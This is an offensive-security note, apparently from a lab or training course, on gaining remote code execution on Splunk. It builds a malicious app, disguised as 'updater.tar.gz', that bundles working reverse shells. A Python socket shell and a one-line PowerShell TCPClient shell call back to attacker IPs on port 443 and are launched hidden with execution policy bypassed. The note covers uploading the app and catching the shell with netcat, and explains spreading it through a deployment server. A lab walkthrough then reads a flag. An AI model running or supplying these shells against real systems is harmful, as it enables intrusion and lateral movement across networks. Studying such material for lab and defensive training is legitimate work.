# Attacking Splunk

We can gain remote code execution on Splunk by creating a custom application to run Python, Batch, Bash, or PowerShell scripts.

## Abusing Built-In Functionality

1) Download shells

mkdir splunk_shell
cd splunk_shell
git clone https://github.com/0xjpuff/reverse_shell_splunk

The bin directory in this repo has examples for Python and PowerShell :

tree reverse_shell_splunk/
reverse_shell_splunk/
├── README.md
└── reverse_shell_splunk
    ├── bin
    │   ├── rev.py
    │   ├── run.bat
    │   └── run.ps1
    └── default
        └── inputs.conf


cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

vi run.bat

@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

2) Change IP on Linux and Windows shells

vi reverse_shell_splunk/reverse_shell_splunk/bin/rev.py

import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

vi reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1

#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.139',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()




3) Create malicious app

tar -cvzf updater.tar.gz reverse_shell_splunk/reverse_shell_splunk/
reverse_shell_splunk/reverse_shell_splunk/
reverse_shell_splunk/reverse_shell_splunk/default/
reverse_shell_splunk/reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/reverse_shell_splunk/bin/
reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/reverse_shell_splunk/bin/rev.py


3) Upload the app

https://10.129.201.50:8000/en-US/manager/search/apps/local
Install app from file 
Upload the application

4) Start a listner

sudo nc -lnvp 443
listening on [any] 443 ...

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the $SPLUNK_HOME/etc/deployment-apps directory on the compromised host. 

## LAB

https://10.129.239.161:8000/en-GB/account/login?return_to=%2Fen-GB%2Fapp%2Flauncher%2Fhome

https://10.129.239.161:8000/en-GB/manager/launcher/apps/local

git clone https://github.com/0xjpuff/reverse_shell_splunk

vi reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1

#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.139',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

tar -cvzf updater.tar.gz reverse_shell_splunk/reverse_shell_splunk/

reverse_shell_splunk/reverse_shell_splunk/
reverse_shell_splunk/reverse_shell_splunk/default/
reverse_shell_splunk/reverse_shell_splunk/default/inputs.conf
reverse_shell_splunk/reverse_shell_splunk/bin/
reverse_shell_splunk/reverse_shell_splunk/bin/run.ps1
reverse_shell_splunk/reverse_shell_splunk/bin/run.bat
reverse_shell_splunk/reverse_shell_splunk/bin/rev.py

--> failed because of intermediate directory

mv reverse_shell_splunk/ todelete
mv todelete/reverse_shell_splunk/ reverse_shell_splunk
rmdir todelete/
mv reverse_shell_splunk/ shell/


sudo nc -lnvp 443


tar -cvzf updater2.tar.gz shell/
shell/
shell/default/
shell/default/inputs.conf
shell/bin/
shell/bin/run.ps1
shell/bin/run.bat
shell/bin/rev.py

sudo nc -lnvp 443


PS C:\Windows\system32> type c:\loot\flag.txt
l00k_ma_no_AutH!
